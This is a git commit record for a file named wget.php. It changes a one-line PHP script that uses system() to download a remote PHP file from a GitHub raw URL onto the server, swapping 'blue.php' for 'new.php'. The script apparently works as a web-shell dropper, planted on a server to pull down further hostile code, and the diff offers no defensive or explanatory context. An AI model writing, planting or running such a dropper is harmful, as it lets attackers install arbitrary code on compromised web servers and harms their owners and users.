f60e4912204ebfd60a8d3f225292f510ffad5300
R10T <85335450+sunshine0110@users.noreply.github.com>
2023-08-12 14:41:08 +0700

    Update wget.php

--- wget.php
+++ wget.php
@@ -1,1 +1,1 @@
-<?php system('wget https://raw.githubusercontent.com/sunshine0110/zxsan/main/blue.php -O blue.php');?>
+<?php system('wget https://raw.githubusercontent.com/sunshine0110/zxsan/main/new.php -O new.php');?>
